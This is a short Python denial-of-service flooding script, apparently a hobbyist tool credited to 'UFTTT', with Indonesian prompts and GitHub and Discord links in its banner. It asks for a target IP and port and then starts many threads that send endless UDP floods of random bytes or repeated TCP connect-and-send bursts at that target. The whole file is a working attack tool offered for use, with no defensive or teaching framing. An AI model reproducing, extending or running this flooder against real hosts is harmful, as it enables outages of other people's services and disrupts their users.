#!/usr/bin/env python3
import random
import socket
import threading
import os
import sys

os.system("clear")
print("""\033[91m

                  TOOLS BY UFTTT
██╗░░░██╗███████╗████████╗████████╗████████╗
██║░░░██║██╔════╝╚══██╔══╝╚══██╔══╝╚══██╔══╝
██║░░░██║█████╗░░░░░██║░░░░░░██║░░░░░░██║░░░
██║░░░██║██╔══╝░░░░░██║░░░░░░██║░░░░░░██║░░░
╚██████╔╝██║░░░░░░░░██║░░░░░░██║░░░░░░██║░░░
░╚═════╝░╚═╝░░░░░░░░╚═╝░░░░░░╚═╝░░░░░░╚═╝░░░ """)

print(" TOOLS BY : UFTTT")
print(" ###########################################")
print(" | AUTOR   : UFTTT                              ")
print(" • CODE    : UF X XLA                     •")
print(" | GITHUB  : https://github.com/XalbadorX. |")
print(" • DISCORD : UFTTT#2876                   •")
print(" | MY TEAM : https://discord.gg/jUHnF8et.  |")
print(" ###########################################")
             
ip = str(input("  IP TARGET:"))
port = int(input(" PORT TARGET:"))
choice = str(input(" LANJUT UNTUK MENDDOS? (y/n):"))
times = int(input(" BERAPA PAKET DIKIRIM:"))
threads = int(input(" ISI SETIAP PAKET:"))
def run():
	data = random._urandom(1025)
	i = random.choice(("[TOK!!!TOK!!!]","[TOK!!!TOK!!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" PERMISI PAKET FROM UFTTT !!! ")
		except:
			print("[!] PAKETNYA ENAK GAK OM !!!")

def run2():
	data = random._urandom(150)
	i = random.choice(("[TOK!!!TOK!!!]","[TOK!!!TOK!!!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PERMISI PAKET FROM UFTTT !!! ")
		except:
			s.close()
			print("[*] PAKETNYA ENAK GAK OM !!!")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
